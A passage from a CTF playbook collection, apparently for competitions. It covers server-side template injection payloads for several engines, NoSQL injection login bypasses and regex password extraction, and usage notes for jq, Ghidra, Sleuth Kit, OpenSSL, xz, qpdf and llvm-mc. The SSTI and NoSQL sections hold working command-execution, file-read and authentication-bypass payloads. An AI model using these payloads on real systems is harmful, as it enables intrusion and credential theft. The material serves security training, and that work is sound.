{{ cycler.__init__.__globals__ }} {{ cycler.__init__.__globals__.os.getcwd() }} {{ cycler.__init__.__globals__.os.listdir('/') }} {{ cycler.__init__.__globals__.os.popen('id').read() }} {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }} {{ joiner.__init__.__globals__.os.popen('id').read() }} {{ namespace.__init__.__globals__.os.popen('id').read() }}These depend on helper implementation/global contents and unrestricted internal attribute access. SecurityError: ... unsafe is evidence of sandbox restrictions; these are not modern sandbox escapes. Read available objects and app source rather than repeatedly sending the same private-attribute chain.
If a reachable function exposes Python builtins, examine whether __builtins__ is a mapping or module. The following mapping form is conditional:
{{ url_for.__globals__['__builtins__']['open']('/flag.txt').read() }} {{ url_for.__globals__['__builtins__']['__import__']('os').listdir('/') }}Attribute syntax and narrow string filters Where equivalent attribute access is allowed:
{{ cycler['__init__']['__globals__']['os'].popen('id').read() }} {{ (cycler|attr('__init__')|attr('__globals__'))['os'].popen('id').read() }} {{ cycler|attr('\x5f\x5finit\x5f\x5f') }} {{ request|attr(request.args.a) }}For the last example, append &a=application to the same request. A filter that checks only one parameter may miss another. Hex escapes build the same attribute string inside a quoted template string; they do not defeat a sandbox’s actual attribute policy. The attr filter looks up attributes; mapping keys still need subscription.
Object graph route when helpers are absent {{ ''.__class__ }} {{ ''.__class__.__mro__ }} {{ ''.__class__.__mro__[1].__subclasses__() }}Inspect the list and identify the actual class before using it. Subclass indexes vary by Python build, imported modules and process state. A copied __subclasses__()[396] is not a portable payload. A subprocess class may not be imported at all. Stay with a simpler exposed function/global when available.
Blind or hidden result {% if 7*7 == 49 %}YES{% else %}NO{% endif %} {% if config.get('DEBUG') %}YES{% else %}NO{% endif %}A controlled marker is easier to reason about than a timeout. Inspect downstream email/PDF/export output if the preview only says “queued.”
4. Twig / PHP {{7*7}} {{'ab'|upper}} {{_self}} {{constant('PHP_VERSION')}} {% for k,v in _context %}{{k}}:{{v}};{% endfor %}constant() may be restricted or unavailable in a sandbox; exposed _context values and application services are more useful than guessing universal helpers.
Historical or permissive Twig setups may accept PHP callable strings in sequence filters:
{{ ['id']|filter('system')|join(',') }} {{ ['id']|map('system')|join(',') }}Treat these as legacy/configuration-dependent candidates, not universal Twig 3 payloads. Modern sandbox policy and versions can require closures, reject the callable, or restrict functions. A rejection identifies a constraint. Current documented arrow syntax, such as {{[1,2]|map(v => v*2)|join(',')}}, proves the filter is available; it does not prove arbitrary PHP execution.
Old _self.env.registerUndefinedFilterCallback(...) recipes target historical Twig internals. Do not spend time on them unless source/version matches. For modern targets, inspect deliberately exposed app objects, template loaders, custom functions and extensions.
5. FreeMarker / Java ${7*7} ${"ab"?upper_case} ${.version} <#assign x=7>${x*7} <#list .data_model?keys as k>${k} </#list>Special variable access and model enumeration depend on wrapper/configuration. A hash-like model may expose keys, while another wrapper does not.
With an unrestricted class resolver that allows the class:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")} <#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}?new class resolution can deny Execute and other dangerous classes. ?api additionally needs api_builtin_enabled=true and an object wrapper supporting API access. Seeing ${7*7} succeed does not establish either condition. Inspect named exposed Java objects if ?new is blocked. File includes normally resolve through a configured template loader, not unrestricted filesystem reads.
6. ERB / Ruby <%= 7*7 %> <%= 'ab'.upcase %> <%= RUBY_VERSION %> <%= self.class %> <%= Dir.pwd %> <%= Dir.entries('/') %> <%= File.read('/flag.txt') %> <%= `id` %>These require actual ERB template-source control in a Ruby context that permits those constants/methods. An app rendering your input as a variable inside ERB does not compile the input again. HTML-escaped file output is still readable in source.
7. EJS / Node <%= 7*7 %> <%= 'ab'.toUpperCase() %> <%= typeof process %> <%= typeof require %> <%= Object.keys(locals).join(',') %>locals name and exposure depend on EJS options. If a CommonJS require binding is actually passed into the render context:
<%= require('fs').readdirSync('/').join(',') %> <%= require('fs').readFileSync('/flag.txt','utf8') %> <%= require('child_process').execSync('id').toString() %>require is not a universal template global. ESM applications and restricted render contexts can lack it. process.mainModule.require(...) is an old, environment-dependent route; mainModule may be absent. Use the actual bindings exposed by source. Ordinary EJS escaped/unescaped output tags do not evaluate user-supplied strings as template source.
8. Smarty {7*7} {$smarty.version} {$smarty.template} {assign var=x value=7}{$x*7} {fetch file='/flag.txt'}fetch needs an available plugin and policy allowing the path; security mode restricts accessible directories. PHP-function modifiers, {php} blocks and old object chains are not portable across Smarty generations. Use the reported version and security configuration. An include may interpret a template instead of returning raw file bytes.
9. If the payload fails Observation Next action Literal braces Check raw bytes, render stage and whether input is template data Only browser evaluates Investigate client-side template/DOM flow 500 on every delimiter Use paired arithmetic and inspect error names; malformed input alone proves little Valid arithmetic, empty object Try a defined constant/string before concluding sandbox SecurityError / denied class Record policy; enumerate exposed safe data / source Output escaped View response source; HTML escaping does not stop server evaluation File missing Enumerate directory through the confirmed primitive; stop guessing filenames URL stops at # or & Encode for the transport; fragments are never sent to server Tool workflow Use Burp Community Repeater for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.
References Engine syntax and restrictions: Jinja sandbox, Twig map, FreeMarker expert builtins, Ruby ERB, EJS documentation, Smarty fetch and security. General workflow: PortSwigger SSTI.

title: jq
content:
Use for: reading JSON API responses, filtering records and decoding log structure.
Run in: WSL.
Inspect structure jq . response.json # Pretty print jq 'keys' response.json # Top-level object keys jq 'type' response.json # Object, array, string, etc. jq '.items | length' response.json # Count recordsExtract fields jq -r '.flag' response.json # String without JSON quotes jq -r '.items[].name' response.json # Names inside an array jq '.items[] | select(.id == 7)' response.json jq -r '.items[] | [.id, .name] | @tsv' response.jsonCTF: search nested text values # Unknown schema: inspect all string values for a clue jq -r '.. | strings | select(test("flag|secret"; "i"))' response.json # Missing field fallback jq -r '.flag // .message // "no matching field"' response.jsonHandle JSON Lines and encoded JSON # One JSON object per line jq 'select(.status == 200)' events.jsonl # A field that itself contains JSON text jq '.payload | fromjson' response.json # Supply a string without shell interpolation inside the filter jq --arg name 'alice' '.items[] | select(.name == $name)' response.jsonGotchas Bash single quotes protect jq’s $variables from shell expansion. -r emits text and can lose JSON type/quoting information. jq parses JSON; HTML error responses will fail. Flags and filter operators explained Syntax Meaning -r Emit string results without JSON quotes -c Compact each JSON result onto one line -s Read all input JSON values into one array -R Read each input line as a raw string rather than parsing JSON -n Run without consuming JSON input --arg NAME VALUE Define a jq string variable safely --argjson NAME JSON Define a variable containing parsed JSON .items[] Emit each element/value from items select(CONDITION) Keep values satisfying a condition // Fallback for null/false values .. Recursively visit values @tsv / @csv Format an array as one TSV/CSV record The | inside a quoted jq filter is jq’s pipeline. An unquoted shell | connects separate processes.
CTF: find a key when the schema is unknown jq 'paths(scalars) as $p | {path: $p, value: getpath($p)}' response.jsonThis keeps field locations with their values. A plain .. | strings search loses that context.
CTF: find duplicate and unique identifiers jq '[.items[].id] | unique' response.json jq '.items | group_by(.owner) | map({owner: .[0].owner, count: length})' response.jsonUseful for understanding ownership or repeated records before testing a web authorization hypothesis.
CTF: select a numeric ID safely jq --argjson wanted 7 '.items[] | select(.id == $wanted)' response.json--arg wanted 7 defines a string "7"; --argjson wanted 7 defines the number 7. JSON type differences can explain an empty result.
CTF: handle keys containing dots jq -r '.["id.orig_h"]' zeek_record.json.id.orig_h instead traverses nested objects and is a different lookup.
CTF: turn raw lines into JSON strings jq -R . candidate_strings.txt > candidate_strings.jsonl jq -Rs . multiline_text.txt > one_json_string.json-R reads raw lines; -Rs slurps the raw input as one string. These preserve quoting for later scripts without using eval or shell interpolation.
Troubleshoot empty or invalid output Result Check null Wrong/missing field path No records Filter condition or wrong JSON types Parse error HTML error, truncated JSON or non-JSON prefix Cannot iterate over null Missing array; inspect structure first Many unexpected values Recursive filter too broad; keep paths/context Reference: jq manual.
Related playbooks GraphQL testing NoSQL injection Source map disclosure

title: NoSQL Injection · Operators & Blind Reads
content:
NoSQL injection First decide which parser you control: JSON query operators or a string inserted into JavaScript. $ne is not SQL syntax; ' || true is not a valid JSON operator object.
1. Establish a baseline Record status, redirect destination, body marker, session cookie and the resulting /me identity. A redirect or new cookie can represent a failed/anonymous session.
POST /login HTTP/1.1 Host: ctf.invalid Content-Type: application/json {"username":"admin","password":"definitely-wrong"}Try one changed field at a time. If the server uses findOne({username: body.username, password: body.password}), an object may be treated as a predicate. If it coerces to a string or hashes a string password first, operator objects usually do not help.
2. Operator injection: first useful pair {"username":"admin","password":{"$ne":"definitely-wrong"}}Negative control:
{"username":"admin","password":{"$eq":"definitely-wrong"}}If only the first authenticates as admin, repeat and inspect /me. $ne also matches a missing field, so a broad query could select an unintended document. Keep a known username fixed when possible.
Candidate Meaning / next observation {"$ne":null} Non-null existing field; different from arbitrary password check {"$gt":""} Greater than empty string under DB comparison rules; not a universal nonempty test {"$regex":"^.*$"} Match a string, including empty; fails for non-string fields {"$regex":"^admin$"} Exact string user match {"$in":["admin","administrator"]} Membership, where nested operator accepted {"$exists":true} Field exists; doesn’t reveal its value {"username":{"$regex":"^admin$"},"password":{"$regex":"^.*$"}} {"username":{"$in":["admin","administrator"]},"password":{"$ne":null}}A backend that validates password after retrieving the user will defeat these login bypasses even if the query itself accepts operators. Investigate search/recovery endpoints separately.
3. URL-encoded objects are parser-dependent A bracket-aware form parser may produce the same nested object:
POST /login HTTP/1.1 Host: ctf.invalid Content-Type: application/x-www-form-urlencoded username=admin&password%5B%24ne%5D=wrongDecoded editor forms:
username=admin&password[$ne]=wrong username=admin&password[$regex]=^.*$ username[$regex]=^admin$&password[$ne]=wrongAn ordinary flat parser may treat password[$ne] as a literal key. password={"$ne":"wrong"} is normally a string, unless application code explicitly parses it again. Switching the content type to JSON only helps if the route accepts JSON.
Symptom Likely cause “password must be string” Schema/type validation before query $ keys removed Sanitizer or explicit operator allowlist Object becomes [object Object] String coercion JSON works; brackets do not Flat form parser or query parser settings Both true and false log in Existing session; clear cookies and verify user Both fail with same error Wrong sink, hashing, operator stripping, or generic error handling 4. Manual regex-prefix extraction Only useful when attacker-controlled regex is applied to the secret value, with a repeatable yes/no response. Querying a stored password hash extracts a hash, not the original password. If the server hashes the input before matching, this route does not apply.
Known account, known oracle:
{"username":"admin","password":{"$regex":"^a"}} {"username":"admin","password":{"$regex":"^b"}} {"username":"admin","password":{"$regex":"^c"}}If ^c matches, extend the confirmed prefix:
{"username":"admin","password":{"$regex":"^ca"}} {"username":"admin","password":{"$regex":"^cb"}} {"username":"admin","password":{"$regex":"^ct"}}A coarse branch can reduce manual requests:
{"username":"admin","password":{"$regex":"^[a-m]"}} {"username":"admin","password":{"$regex":"^[n-z]"}} {"username":"admin","password":{"$regex":"^[0-9]"}}Split a matching class until one character remains, then append it to the prefix. Continue until an end-anchored test succeeds:
{"username":"admin","password":{"$regex":"^ctf\\{example\\}$"}}In the JSON source above, \\ shown as two backslash characters represents one backslash in the regex after JSON parsing. For a literal . use JSON regex text "\\."; for a literal backslash, JSON needs "\\\\". Escape .^$*+?()[]{}|\ when they occur in discovered data. Do not use $options:"i" while recovering a case-sensitive secret.
Length probes for a string value:
{"username":"admin","password":{"$regex":"^.{8}$"}} {"username":"admin","password":{"$regex":"^.{9}$"}} {"username":"admin","password":{"$regex":"^.{10,}$"}}. normally excludes newline. An accepted regex can still match multiple documents; fix account identity and check every result against a false control.
5. JavaScript syntax injection: separate path Possible vulnerable construction:
// The dangerous feature is untrusted concatenation, not MongoDB itself. { $where: "this.category == '" + input + "'" }For exactly that single-quoted expression context:
normal' normal' && '1'=='1 normal' && '1'=='2 normal' || '1'=='1 normal' || '1'=='2True/false behavior should follow the changed condition. Operator precedence matters; inspect source if available. An error on a quote alone might be a JSON/parser error before any database query.
If a complete top-level $where operator is accepted and server-side JavaScript is enabled:
{"$where":"this.username === 'admin' && this.password.length === 8"} {"$where":"this.username === 'admin' && this.password[0] === 'a'"} {"$where":"this.username === 'admin' && this.password[0] === 'b'"}These are complete filter objects, not values to paste into every password field. $where must reach the query at the correct level. MongoDB JavaScript runs in a database-side environment; it does not provide Node’s require('fs') or ordinary app process access. New deployments may disable server-side JS; $where is deprecated starting MongoDB 8.0. Prefer normal query operators when available.
6. Fields, types and data exposure If a search route accepts a whole query document, inspect whether it also accepts separate projection, sort or limit options. Their argument positions are driver/application-specific.
{"query":{"username":"admin"},"projection":{"username":1,"flag":1,"_id":0}}That request is an application wrapper example, not MongoDB wire syntax. Use names exposed by source or existing client requests. ObjectId values, strings, booleans and numbers compare differently; preserve the original field type. A missing result might be a type mismatch rather than access control.
7. Finish and troubleshoot Confirm query manipulation with a true/false pair. Verify the selected user or document, not just HTTP status. Enumerate fields from actual JSON/source/error hints. Use regex extraction only where the secret participates in the query. Record the parsed object shape and content type with the winning input. If a returned flag is truncated, inspect raw JSON rather than rendered UI. If every result changes randomly, remove timestamps/CSRF values from comparisons and compare a stable data marker.
Tool workflow Use Burp Community Repeater for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.
References Operator behavior: MongoDB regex, MongoDB query predicates. Injection contexts and manual controls: PortSwigger NoSQL injection.

title: Ghidra
content:
Use for: static disassembly, decompilation and validation logic.
Run in: WSL GUI per the supplied list. Listed version: 12.1.4.
Launch the supplied installation # Run from the installed Ghidra directory ./ghidraRunWalkthrough: find the input check File → New Project → Non-Shared Project. Import the binary, inspect the detected format/architecture, then open it. Accept auto analysis. Search → For Strings; search for success/failure text. Follow a string’s references to its caller. Read the Decompiler alongside the assembly listing. Identify input, transformations, constants and comparison length. Rename functions/variables and save the project. Useful navigation Action Common key/control Go to address G Rename selected symbol L References to selected item Right click → References Follow function Double click Inspect imports/functions Symbol Tree Show raw bytes Bytes field / Byte Viewer CTF notes Translate the validation loop into Python and reproduce it on known input. Check array sizes, signedness and endianness in assembly. An entry function is not always main; follow startup calls. Apply meaningful names as you learn what a value does. Gotchas Decompiled C is an approximation; verify surprising logic in assembly. A wrong architecture or image base gives misleading results. Packed/encrypted code may need runtime analysis in gdb/x64dbg. CTF: work backward from a success string Search for a distinctive success or rejection string. List every cross-reference; one string can have several callers. Find the branch deciding which message is printed. Trace the compared buffer/value backward to its producer. Record preprocessing: newline stripping, length checks, XOR, encoding or hashing. Reproduce the exact operations in Python. Confirm the generated candidate follows the binary’s full success path. CTF: translate a byte validation loop // Example logic recovered during analysis for (i = 0; i < length; i++) { if ((input[i] ^ 0x23) != expected[i]) return 0; }The inverse is input[i] = expected[i] ^ 0x23. Export the actual array bytes, preserve the iteration count, and test the inverse by reapplying the forward transform.
expected = bytes.fromhex("454f42445847464e4c5e") candidate = bytes(b ^ 0x23 for b in expected) assert bytes(b ^ 0x23 for b in candidate) == expected print(candidate)This produces the worked example flag{demo}. Real challenges can combine operations whose inverse order matters.
Fix the analysis model Symptom Useful correction Bytes displayed as undefined data Define data/code only after confirming the region Buffer shown as scalar integers Apply an array or pointer type Function prototype looks wrong Inspect calling convention and call sites Missing string Try encoded/wide strings or inspect raw data Indirect call unresolved Trace function pointer/table and verify at runtime Renaming and retyping improves readability, but a plausible type can hide a wrong assumption. Check the assembly at boundaries and casts.
CTF: inspect an embedded resource Find resource/section references, identify the length and extraction point, then export exactly that range. If the buffer is decrypted only at runtime, use gdb/x64dbg to dump it after the transformation. Static ciphertext will not decompile as the eventual payload.
Use the Function Graph for branch-heavy checks Open the graph for the validation function, mark the blocks leading to rejection, and inspect the conditions connecting them. Track constraints in a small table: input index, operation, constant and comparison. This is more reliable than reading a large decompiler expression as one sentence.
GUI versus CLI ./ghidraRun is the GUI launcher. ./ means execute a file in the current directory; it is not an analysis flag. Headless analysis has a separate launcher and project/script arguments. For an interactive tournament solve, the GUI flow above preserves labels, types and references in a saved project.
Reference: Ghidra beginner guide.
Related playbooks Deep Ghidra cheatsheet Built-ins and optional extensions Static analysis

title: The Sleuth Kit
content:
Use for: disk partitions, filesystem records and deleted file recovery.
Run in: WSL. Autopsy provides a Windows GUI workflow.
Locate the filesystem # Find partition start sectors mmls disk.img # Example start sector: replace 2048 with YOUR partition's start fsstat -o 2048 disk.img-o is a sector offset, not a byte offset. For a filesystem-only image, omit -o. Confirm sector size from the image/tool output; -b can specify it when needed.
List current and deleted entries fls -r -p -o 2048 disk.img > file_listing.txt fls -r -d -p -o 2048 disk.img > deleted_listing.txt grep -niE 'flag|secret|password' file_listing.txtRecover a selected entry # Replace 12345 with the metadata address printed by fls istat -o 2048 disk.img 12345 icat -o 2048 disk.img 12345 > recovered.bin # Attempt deleted-file recovery using its listed metadata address icat -r -o 2048 disk.img 12345 > recovered_deleted.binOn NTFS, a listed address can include attribute components such as 12345-128-1; preserve the complete address.
Build a filesystem timeline fls -r -m / -o 2048 disk.img > bodyfile.txt mactime -b bodyfile.txt -d > timeline.csvGotchas Wrong partition offset produces misleading errors. Deleted content may be overwritten or incomplete. Extract evidence into a separate output directory. Flags explained by command Tool / option Meaning fls -r Recurse through directories; deleted directories have recovery limitations fls -p Show full paths fls -d Show deleted entries only fls -m / Emit bodyfile timeline records using / as the mount-point prefix -o N on fls/icat/fsstat/istat Filesystem starts at sector N -b N on supporting tools Device sector size in bytes icat -r Attempt deleted-file recovery mactime -b FILE Read a bodyfile; here -b does NOT mean sector size mactime -d Write comma-delimited output tsk_recover -e Export allocated and unallocated files CTF: filesystem-only versus whole-disk image mmls disk.img fsstat filesystem.img fsstat -o 2048 disk.imgChoose the latter offset from the partition listing, not from a copied example. A filesystem-only image can be valid even if mmls finds no partition table.
CTF: recover all available files into a new directory mkdir -p recovered_all tsk_recover -e -o 2048 disk.img recovered_all/Without -e, tsk_recover normally focuses on unallocated files. Broad extraction can be large; use fls/icat for a targeted candidate when time or space is limited.
CTF: inspect an NTFS alternate stream Read the full metadata/attribute address from fls; do not keep only the first numeric component.
# Example NTFS attribute address from a listing icat -o 2048 disk.img 42-128-3 > named_stream.binThe address is specific to the image. Verify name, type and length with istat and the directory listing.
CTF: produce a timeline and filter a time window fls -r -m / -o 2048 disk.img > bodyfile.txt mactime -b bodyfile.txt -d > timeline.csv grep -iE 'flag|secret|Downloads|Desktop' timeline.csvUnderstand the filesystem’s timestamp semantics and selected timezone before comparing with event logs or packet timestamps. A changed filename does not necessarily imply the file’s contents changed at the same time.
Interpret directory listing evidence The metadata address identifies the file record/attribute used for extraction. A deleted marker indicates directory-entry status, not guaranteed recoverable data. If clusters were reused, a successful icat can still return unrelated or partially overwritten content.
Recovery record image hash: <sha256> partition start / sector size: <N> / <bytes> filesystem: <type> source path: <path from fls> metadata address: <complete address> command: <exact icat/tsk_recover invocation> output hash and validation: <values>References: fls, icat, tsk_recover, mactime.
Related playbooks File signatures and bounded carving Artifact triage

title: OpenSSL
content:
Use for: Base64, hashes, certificate/key inspection and known-parameter decryption.
Run in: WSL; listed as OpenSSL 3.x.
Decode or hash a file openssl version openssl base64 -d -in encoded.txt -out decoded.bin openssl base64 -d -A -in single_line_base64.txt -out decoded.bin openssl dgst -sha256 challenge.bin-A is useful for Base64 supplied as one unwrapped line.
Inspect keys and certificates # Certificate subject, issuer and validity dates openssl x509 -in certificate.pem -noout -subject -issuer -dates # All certificate fields openssl x509 -in certificate.pem -noout -text # Public/private key parameters openssl pkey -pubin -in public.pem -text -noout openssl pkey -in private.pem -text -noout # ASN.1 structure openssl asn1parse -in certificate.pemAdd -inform DER for binary DER input where the command supports it.
CTF: decrypt AES with raw key and IV # Example AES-128-CBC values; replace with challenge parameters openssl enc -d -aes-128-cbc -in ciphertext.bin -out plaintext.bin \ -K 00112233445566778899aabbccddeeff \ -iv 000102030405060708090a0b0c0d0e0f-K and -iv accept hex bytes. Password derived encryption uses different parameters:
# Prompts for a password; only correct if encryption used these parameters openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 \ -in encrypted.bin -out plaintext.binGotchas Match mode, padding, salt, digest and KDF exactly. bad decrypt can indicate several parameter mismatches. enc does not support AEAD modes such as GCM. Flags explained by OpenSSL subcommand Flag / context Meaning -in FILE, -out FILE Read/write the selected file base64 -d / enc -d Decode Base64 / decrypt encrypted data base64 -A Process Base64 without the normal newline wrapping assumptions enc -aes-128-cbc Choose AES-128 in CBC mode enc -K HEX Supply raw encryption-key bytes as hex enc -iv HEX Supply IV bytes as hex enc -pbkdf2 -iter N Derive key/IV using PBKDF2 with N iterations -pubin Interpret the key input as public rather than private -inform DER, -outform DER Select binary DER input/output representation -text Print decoded structure/details -noout Suppress the usual encoded object output x509 -subject -issuer -dates Display certificate identity and validity fields rsa -modulus Print the RSA modulus pkeyutl -decrypt -inkey FILE Decrypt with the chosen private key -pkeyopt NAME:VALUE Set an algorithm/padding-specific parameter s_client -connect HOST:PORT Connect to a TLS service s_client -servername NAME Send the TLS SNI hostname s_client -showcerts Print the certificate chain sent by the peer s_client -CAfile FILE Load trusted CA certificates for verification asn1parse -i Indent ASN.1 structure by nesting depth dgst -sha256 Select SHA-256 hashing dgst -verify KEY -signature FILE Verify the supplied signature using that key Read each flag with its subcommand. OpenSSL is a collection of commands and the meaning/availability of options is not global.
CTF: inspect RSA modulus and exponent openssl rsa -pubin -in public.pem -text -noout openssl rsa -pubin -in public.pem -modulus -nooutUse the modulus/exponent to choose a weak-RSA technique. A key printed successfully only confirms parsing, not weakness.
CTF: RSA decrypt with a recovered private key # OAEP example: this digest must match how the challenge encrypted openssl pkeyutl -decrypt -inkey recovered_private.pem \ -in ciphertext.bin -out plaintext.bin \ -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 # PKCS#1 v1.5 encryption padding, when explicitly required openssl pkeyutl -decrypt -inkey recovered_private.pem \ -in ciphertext.bin -out plaintext.bin -pkeyopt rsa_padding_mode:pkcs1Different padding modes are not interchangeable. For textbook RSA, Python integer modular exponentiation is often easier to inspect and verify.
CTF: connect to a TLS challenge service # Inspect the handshake and presented certificates openssl s_client -connect 192.0.2.10:443 -servername challenge.example -showcertsSNI (-servername) can determine which virtual host/certificate you receive. This does not automatically make certificate verification succeed. For a challenge with a supplied CA, pass -CAfile challenge_ca.pem as appropriate.
Convert formats before another tool parses them # DER certificate → PEM openssl x509 -inform DER -in cert.der -out cert.pem # PEM public key → DER openssl pkey -pubin -in public.pem -outform DER -out public.derInspect ASN.1 and certificate extensions openssl asn1parse -inform DER -in blob.der -i openssl x509 -in cert.pem -noout -text > certificate_details.txtLook for alternate names, custom extensions and unexpected strings. ASN.1 offsets describe the parsed input; do not assume they are offsets in another file/container.
Verify a supplied signature # For a signature created using a matching SHA-256 signing scheme openssl dgst -sha256 -verify public.pem \ -signature signature.bin message.binThe digest and signing scheme must match. A failed verification can mean changed message bytes, a wrong key, or wrong scheme parameters.
Troubleshoot raw AES parameters Problem Inspect Key too short / padded with zeroes Count decoded key bytes; choose the right AES size First block wrong, later blocks plausible in CBC Check IV Every block wrong Check key, mode and input decoding Last block/padding error Check truncation, padding and all parameters Salted__ prefix Determine OpenSSL password derivation parameters Algorithm unavailable OpenSSL 3 provider configuration and build support References: enc, pkeyutl, s_client, x509.
Related playbooks TLS/SSH capture analysis CyberChef key and IV formats

title: xz
content:
Use for: decompressing XZ/LZMA streams and checking archive integrity.
Run in: WSL.
Inspect before decompressing xz --version xz -l evidence.xz # Size, ratio and stream summary xz -lv evidence.xz # More stream/block details xz -t evidence.xz # Integrity test; no extracted outputDecompress while preserving the input xz -dk evidence.xz # Explicit output filename; keeps original and writes bytes to stdout xz -dc evidence.xz > evidence.bin # Legacy .lzma stream xz --format=lzma -dc evidence.lzma > evidence.binCTF walkthrough Identify an XZ stream directly or through binwalk. Record its offset if it is embedded inside another file. Carve it, check integrity with xz -t, then decompress. Inspect the resulting bytes with xxd and strings. # Example embedded offset; replace 4096 with the actual value dd if=container.bin of=carved.xz bs=1 skip=4096 status=none xz -dc carved.xz > recovered.bin xxd -l 64 recovered.binGotchas xz -d normally removes the compressed input after success; add -k to keep it. .tar.xz decompresses into a tar archive, not its individual members. A raw LZMA stream needs the correct filter settings; it is different from a .lzma container. Flags explained Flag Meaning -d Decompress -k Keep the original input after successful operation -c Write output to stdout instead of a generated filename -t Test compressed-stream integrity -l List compressed-stream information -v Verbose output; combines with -l --format=lzma Select the legacy .lzma container --memlimit-decompress=LIMIT Bound decompression memory use -dk combines -d and -k; -dc combines decompression with stdout output. Shell > saves that stdout into the requested filename.
CTF: recognize container signatures xxd -l 16 evidence.binAn XZ stream starts with FD 37 7A 58 5A 00. A file extension alone is insufficient; legacy LZMA and raw streams have different framing.
CTF: decompress without trusting a filename # Explicit input format, output filename and memory bound xz --format=xz --memlimit-decompress=256MiB -dc evidence.bin > out.binIf the output is a tar archive, inspect/extract it using available approved utilities or Python’s standard tarfile module. Decompression and archive member extraction are separate steps.
CTF: inspect a decompressed TAR from Python import tarfile with tarfile.open("out.bin", "r:") as archive: for member in archive.getmembers(): print(member.name, member.size, "file" if member.isfile() else "other")Inspect names before extraction. For one chosen regular member, use extractfile() and save it to your own chosen output path rather than honoring arbitrary member paths.
Troubleshooting Symptom Next check File format not recognized Offset, wrapper and correct input bytes Unexpected end of input Truncation or wrong carve length Integrity check failed Corruption, missing bytes or incorrect boundary Memory limit exceeded Required dictionary size versus available budget Decompression works, file still unreadable Another container/encoding layer Reference: XZ manual.
Related playbooks Archives and embedded files

title: qpdf
content:
Use for: PDF structure, decompressed objects, encryption and attachments.
Run in: WSL.
Check the document qpdf --check challenge.pdf qpdf --show-encryption challenge.pdf qpdf --show-npages challenge.pdf qpdf --show-pages challenge.pdfMake objects easier to read # Produces a separate PDF with readable object structure qpdf --qdf --object-streams=disable challenge.pdf readable.pdf strings -a readable.pdf | grep -iE 'flag|secret|JavaScript|EmbeddedFile'This is structural inspection, not guaranteed text extraction. Use pdftotext for normal page text.
Extract an attachment qpdf --list-attachments challenge.pdf # Use the exact key reported above; it may differ from the filename qpdf --show-attachment='attachment-key' challenge.pdf > attachment.binInspect and extract a stream object # Replace 12 with the relevant object number qpdf --show-object=12 challenge.pdf qpdf --show-object=12 --filtered-stream-data challenge.pdf > stream.bin--filtered-stream-data decodes supported stream filters; the result may still be binary.
Decrypt with a supplied password qpdf --password='supplied-password' --decrypt challenge.pdf decrypted.pdfGotchas Write to a new file to preserve the challenge artifact. Repairing/rebuilding can discard evidence from older PDF revisions. Object numbers and attachment keys are document specific. Flags explained Flag Meaning --check Check PDF structure and report problems --show-encryption Describe document encryption settings --show-npages Print the page count --show-pages List page and content-stream object references --qdf Write a form intended for easier inspection/editing --object-streams=disable Store objects outside compressed object streams --list-attachments Print embedded attachment keys --show-attachment=KEY Write one attachment’s raw bytes to stdout --show-object=N Inspect object N --filtered-stream-data Emit decoded contents of the selected stream --raw-stream-data Emit the selected stream before filter decoding --password=VALUE Supply the known input password --decrypt Write decrypted output, when input can be opened --json Export supported structure as JSON CTF: inspect PDF actions and embedded objects qpdf --qdf --object-streams=disable challenge.pdf readable.pdf grep -a -nE '/(OpenAction|JavaScript|JS|EmbeddedFiles|Filespec|URI)' readable.pdfgrep -a treats the file as text and -n gives lines in the rewritten file. Follow referenced objects rather than treating nearby text as belonging to the same action.
CTF: export one identified content stream qpdf --show-pages challenge.pdf # Example object ID only; use the content reference printed above qpdf --show-object=17 --filtered-stream-data challenge.pdf > page_stream.bin xxd -l 128 page_stream.bin strings -a page_stream.binA PDF content stream contains drawing/text operators and encoded font references. It may not read like the visible page; pdftotext performs an additional interpretation step.
CTF: compare compressed and decoded bytes qpdf --show-object=17 --raw-stream-data challenge.pdf > raw_stream.bin qpdf --show-object=17 --filtered-stream-data challenge.pdf > decoded_stream.binThis helps identify whether another encoding layer exists after PDF filter decoding. Both commands export only one selected stream.
CTF: inspect the structure with jq qpdf --json challenge.pdf > structure.json jq 'keys' structure.json jq -r '.. | strings | select(test("flag|secret|attachment"; "i"))' structure.jsonJSON structure varies with the qpdf JSON version. Inspect keys before writing a filter; binary stream bytes are not guaranteed to be embedded by a basic JSON export.
Recognize incremental revisions PDFs can contain older objects and cross-reference revisions. A successful qpdf rewrite may retain only the resolved current structure. Preserve the original, inspect its raw bytes for prior evidence, and distinguish original offsets from rewritten offsets.
Reference: qpdf CLI manual.
Related playbooks PDF and document analysis

title: llvm-mc (LLVM tools)
content:
Use for: assembling instructions and decoding short byte sequences across architectures.
Run in: WSL. Some distributions name the executable llvm-mc-VERSION.
Inspect the installed targets llvm-mc --version llvm-mc --helpx86-64: instruction → bytes printf 'mov eax, 42
ret
' | llvm-mc \ --triple=x86_64-pc-linux-gnu --x86-asm-syntax=intel --show-encodingUse this to confirm a candidate instruction’s encoding while reading a CTF binary.
x86-64: bytes → instruction printf '0x90 0xc3
' | llvm-mc \ --triple=x86_64-pc-linux-gnu --disassemble --output-asm-variant=1The example decodes a NOP followed by RET. The disassembler input is textual hex bytes.
AArch64 encoding printf 'mov x0, #42
ret
' | llvm-mc \ --triple=aarch64-linux-gnu --show-encodingWrite an object file llvm-mc --triple=x86_64-pc-linux-gnu --filetype=obj input.s -o output.o objdump -d -M intel output.oGotchas An object file has headers and possibly relocations; it is not a raw byte blob. Match architecture, bitness, instruction mode and endianness. Some instructions need extra CPU features enabled. llvm-mc does not execute or emulate the instructions. Flags explained Flag Meaning --triple=TARGET Select architecture/vendor/OS target --x86-asm-syntax=intel Parse Intel-style x86 input --show-encoding Print emitted instruction bytes --disassemble Interpret text byte values as machine instructions --output-asm-variant=1 Select Intel-style output for x86 --filetype=obj Write a relocatable object file -o FILE Set the output filename --version Print version and available targets The target must match the challenge. Selecting x86-64 does not correctly decode a 32-bit instruction stream in every case.
CTF: compare instruction encodings printf 'xor eax, eax
ret
